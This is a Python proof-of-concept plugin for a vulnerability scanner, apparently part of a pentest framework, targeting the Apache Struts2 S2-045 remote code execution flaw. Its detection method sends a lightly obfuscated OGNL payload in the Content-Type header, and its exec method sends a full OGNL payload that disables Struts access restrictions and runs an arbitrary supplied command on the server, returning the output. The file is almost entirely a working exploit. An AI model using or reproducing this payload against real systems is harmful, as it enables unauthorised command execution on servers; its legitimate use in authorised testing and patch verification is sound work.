#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script, VUL_LEVEL, VUL_TYPE

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'Struts2-045'
        self.keyword = ['struts2', 'java']
        self.info = 'Struts2-045'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.CRITICAL
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.url != None:
            async with ClientSession() as session:
                headers = {}
                headers["Content-Type"] = "%{#context['co'+'m.ope'+'nsympho'+'ny.xw'+'ork2.di'+'spatch'+'er.Htt'+'pServl'+'etResponse'].addHeader('header_str2045','header_str2045'+'_'+'multipart/form-data')}"
                async with session.get(url=self.url, headers = headers) as res:
                    if res and 'header_str2045_multipart' in res.headers.get('header_str2045', '') :
                        self.flag = 1
                        self.req.append({"headers":headers})
                        self.res.append({"info": self.url, "key": "header_str2045"})


    async def exec(self):
        await self.get_url()
        if self.url != None:
            cmd = self.parameter['cmd']
            headers = {}
            headers["Content-Type"] = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#s=new java.util.Scanner((new java.lang.ProcessBuilder('%COMMAND%'.toString().split('\\\\s'))).start().getInputStream()).useDelimiter('\\\\AAAA')).(#str=#s.hasNext()?#s.next():'').(#res.getWriter().print(#str)).(#res.getWriter().flush()).(#res.getWriter().close()).(#s.close())}".replace("%COMMAND%",cmd)
            async with ClientSession() as session:
                async with session.get(url=self.url,headers = headers) as res:
                    if res:
                        text = await res.text()
                        text = text.strip().rstrip()
                        self.flag = 1
                        self.req.append({"headers": headers})
                        self.res.append({"info": text,"key":cmd})
